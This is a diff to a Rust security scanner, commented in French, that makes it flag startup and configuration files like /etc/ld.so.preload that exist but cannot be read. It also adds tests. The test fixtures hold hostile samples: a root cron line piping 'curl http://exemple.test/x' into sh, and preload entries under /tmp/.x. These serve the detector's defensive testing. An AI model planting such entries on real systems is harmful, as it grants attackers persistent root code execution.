@@ -2531,8 +2531,19 @@ impl Lecture {
 
 /// Lit un fichier de démarrage ou de configuration, borné (`temoins::lire_borne` : jamais un tube, un périphérique
 /// ni plus de `LECTURE_MAX` octets). Ce qui ne se lit pas en entier, ou un tube nommé à la place du fichier, est dit
-/// dans l'alerte, jamais compté comme sain ; absent ou interdit de lecture, il est sauté comme avant.
+/// dans l'alerte, jamais compté comme sain. Absent, il est sauté ; présent mais illisible (droits, dossier, boucle de
+/// liens, disque), il est dit aussi (`illisible`) : avant, il était sauté sans un mot et le bilan restait vert (N5).
 fn lire(f: &Path, h: &Path, t: &mut Lancements) -> Option<Lecture> {
+    lire_sinon(f, h, t, |t, e| illisible(f, h, t, e))
+}
+
+/// `lire`, où l'appelant décide de ce qui se dit d'une lecture ratée (`sinon`), sauf le tube nommé, toujours dit ici.
+fn lire_sinon(
+    f: &Path,
+    h: &Path,
+    t: &mut Lancements,
+    sinon: impl FnOnce(&mut Lancements, &std::io::Error),
+) -> Option<Lecture> {
     match temoins::lire_borne(f, LECTURE_MAX) {
         Ok(lu) => {
             if !lu.entier {
@@ -2562,7 +2573,38 @@ fn lire(f: &Path, h: &Path, t: &mut Lancements) -> Option<Lecture> {
             );
             None
         }
-        Err(_) => None,
+        Err(e) => {
+            sinon(t, &e);
+            None
+        }
+    }
+}
+
+/// La raison d'une lecture ratée, telle que le système la donne (« Permission denied »…).
+fn raison_illisible(e: &std::io::Error) -> String {
+    trf!(
+        "illisible ({})",
+        "unreadable ({})",
+        crate::ui::affichable(&e.to_string())
+    )
+}
+
+/// Un fichier de démarrage ou de configuration présent qui ne se lit pas (`e`) : absent, rien à dire ; sinon levé
+/// (`non_lu`), ou, s'il est à root seul, une information (comme `popt_non_lu`, V-8 : un /etc/crontab en 600, durci
+/// exprès, n'est pas un lancement suspect, mais ce qu'il lance n'est pas vu et c'est dit).
+fn illisible(f: &Path, h: &Path, t: &mut Lancements, e: &std::io::Error) {
+    if e.kind() == std::io::ErrorKind::NotFound {
+        return;
+    }
+    let raison = raison_illisible(e);
+    if de_root_seul(f) {
+        t.informations.push(trf!(
+            "{} : {raison}, à root seul : ce qu'il lance n'est pas vu",
+            "{}: {raison}, root-only: what it starts is not seen",
+            court(f, h)
+        ));
+    } else {
+        non_lu(f, h, t, &raison);
     }
 }
 
@@ -6984,7 +7026,15 @@ fn lire_prechargement(
 ) {
     let preload = racine.join("etc/ld.so.preload");
     let h = t.r.maison.clone();
-    if let Some(lu) = lire(&preload, &h, t) {
+    // Présent mais illisible, il est levé même à root seul (N5) : le chargeur le lit pour chaque programme, et un
+    // fichier que le compte ne lit pas se charge encore dans les programmes de root. Sur un système sain, il est
+    // lisible par tous, ou absent ; l'avis du démarrage dit la même chose (`protection::environnement`).
+    let illisible = |t: &mut Lancements, e: &std::io::Error| {
+        if e.kind() != std::io::ErrorKind::NotFound {
+            non_lu(&preload, &h, t, &raison_illisible(e));
+        }
+    };
+    if let Some(lu) = lire_sinon(&preload, &h, t, illisible) {
         use std::os::unix::ffi::OsStrExt as _;
         // Lu sur les octets comme le lit le chargeur de glibc, sa boucle de commentaires comprise (un « # » ne ferme
         // pas toujours sa ligne : relecture adverse du lot 096, C1), réuni avec la lecture « un # ferme sa ligne »
@@ -13660,12 +13710,13 @@ fn juger_popt(t: &mut Lancements) {
         }
     }
     for f in fichiers {
-        let Some(lu) = lire(&f, &h, t) else {
-            // Un tube, `lire` l'a déjà dit ; tout autre réglage présent qui ne se lit pas : dit ici.
-            let tube = std::fs::metadata(&f).is_ok_and(|m| std::os::unix::fs::FileTypeExt::is_fifo(&m.file_type()));
-            if std::fs::symlink_metadata(&f).is_ok() && !tube {
+        // Un tube, `lire_sinon` le dit ; tout autre réglage présent qui ne se lit pas (un lien mort compris) : dit ici.
+        let sinon = |t: &mut Lancements, _: &std::io::Error| {
+            if std::fs::symlink_metadata(&f).is_ok() {
                 popt_non_lu(t, &f, f == compte);
             }
+        };
+        let Some(lu) = lire_sinon(&f, &h, t, sinon) else {
             continue;
         };
         for (n, ligne, simple) in lignes_de_popt(&lu.texte) {
@@ -19494,6 +19545,93 @@ mod tests {
         }
     }
 
+    /// Ronde 3 du lot 096 (N5) : un /etc/ld.so.preload présent mais illisible (un dossier à sa place, une boucle de
+    /// liens) n'est jamais un bilan vert : il est levé, « non vérifié », avec la raison du système, comme l'avis du
+    /// démarrage le dit déjà. Avant, `lire` le sautait sans un mot : « Aucun lancement automatique suspect ».
+    /// Témoins : absent, ou lien mort (le chargeur ne lit rien), le bilan reste muet.
+    #[test]
+    fn preload_illisible_jamais_vert() {
+        for sorte in ["dossier", "boucle", "absent", "lien mort"] {
+            let m = Maison::nouvelle(&format!("preload-illisible-{}", sorte.replace(' ', "-")));
+            let p = m.racine.join("etc/ld.so.preload");
+            std::fs::create_dir_all(p.parent().unwrap()).unwrap();
+            match sorte {
+                "dossier" => std::fs::create_dir(&p).unwrap(),
+                "boucle" => std::os::unix::fs::symlink("ld.so.preload", &p).unwrap(),
+                "lien mort" => std::os::unix::fs::symlink("rien-ici", &p).unwrap(),
+                _ => {}
+            }
+            let c = m.lancements();
+            if matches!(sorte, "absent" | "lien mort") {
+                assert_eq!(c.probleme, None, "{sorte} : {}", c.message);
+                continue;
+            }
+            assert_eq!(c.probleme, Some(Niveau::Eleve), "{sorte} : {}", c.message);
+            assert!(
+                c.message.contains("ld.so.preload : illisible (") && c.message.contains("non vérifié"),
+                "{sorte} : {}",
+                c.message
+            );
+        }
+    }
+
+    /// N5, la preuve de la vérification : /etc/ld.so.preload sans aucun droit (mode 000) est levé avec la raison du
+    /// système. Sous root ou « unshare -r », le fichier se lit quand même : l'essai le dit sauté.
+    #[test]
+    fn preload_sans_droits_jamais_vert() {
+        use std::os::unix::fs::PermissionsExt as _;
+        let m = Maison::nouvelle("preload-000");
+        m.ecrire_hors("/etc/ld.so.preload", "/usr/lib/libinventee.so\n");
+        let p = m.racine.join("etc/ld.so.preload");
+        std::fs::set_permissions(&p, std::fs::Permissions::from_mode(0o000)).unwrap();
+        if std::fs::read(&p).is_ok() {
+            return crate::essais::saute("un fichier en mode 000 se lit ici (root ou « unshare -r »)");
+        }
+        let c = m.lancements();
+        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+        assert!(
+            c.message.contains("ld.so.preload : illisible (") && c.message.contains("non vérifié"),
+            "{}",
+            c.message
+        );
+    }
+
+    /// N5 pour tout fichier de démarrage ou de configuration lu par `lire` : présent mais illisible, il est levé au
+    /// compte (« non lu ») ; à root seul, une information (V-8 : un /etc/crontab en 600, durci exprès, n'est pas un
+    /// lancement suspect) ; absent, rien. Un ~/.bashrc remplacé par un dossier, lui, lève le bilan.
+    #[test]
+    fn illisible_dit_selon_a_qui() {
+        let m = Maison::nouvelle("bashrc-dossier");
+        std::fs::create_dir_all(m.chemin(".bashrc")).unwrap();
+        let c = m.lancements();
+        assert_eq!(c.probleme, Some(Niveau::Eleve), "{}", c.message);
+        assert!(
+            c.message.contains("~/.bashrc : illisible (") && c.message.contains("non vérifié"),
+            "{}",
+            c.message
+        );
+        let refus = std::io::Error::from(std::io::ErrorKind::PermissionDenied);
+        let h = m.chemin("");
+        let mut t = Lancements::default();
+        illisible(
+            &m.chemin(".zshrc"),
+            &h,
+            &mut t,
+            &std::io::Error::from(std::io::ErrorKind::NotFound),
+        );
+        assert!(t.suspects.is_empty() && t.informations.is_empty());
+        illisible(&m.chemin(".zshrc"), &h, &mut t, &refus);
+        assert_eq!((t.suspects.len(), t.informations.len()), (1, 0), "{:?}", t.suspects);
+        let systeme = Path::new("/etc/passwd");
+        if !de_root_seul(systeme) {
+            return crate::essais::saute("/etc/passwd n'est pas à root seul ici (« unshare -r » ?)");
+        }
+        let mut t = Lancements::default();
+        illisible(systeme, &h, &mut t, &refus);
+        assert_eq!((t.suspects.len(), t.informations.len()), (0, 1), "{:?}", t.suspects);
+        assert!(t.informations[0].contains("à root seul"), "{:?}", t.informations);
+    }
+
     /// Ronde 3 du lot 096 (N4) : une ligne signalée qui porte un octet hors UTF-8 ne se désigne pas au fils root (il
     /// la cherche par l'empreinte de ses octets, et la ligne lue avec pertes n'a plus ces octets-là) : la correction
     /// reste à la main, et c'est dit. Avant, « Retirer ces lignes » était offert, le fils ne trouvait rien et
@@ -19503,8 +19641,16 @@ mod tests {
         for (i, (lieu, octets, designable)) in [
             ("etc/ld.so.preload", &b"/tmp/.x/\xff.so\n"[..], false),
             ("etc/ld.so.preload", b"/tmp/.x/l.so\n", true),
-            ("etc/cron.d/maj", b"* * * * * root curl http://exemple.test/\xff | sh\n", false),
-            ("etc/cron.d/maj", b"* * * * * root curl http://exemple.test/x | sh\n", true),
+            (
+                "etc/cron.d/maj",
+                b"* * * * * root curl http://exemple.test/\xff | sh\n",
+                false,
+            ),
+            (
+                "etc/cron.d/maj",
+                b"* * * * * root curl http://exemple.test/x | sh\n",
+                true,
+            ),
         ]
         .into_iter()
         .enumerate()
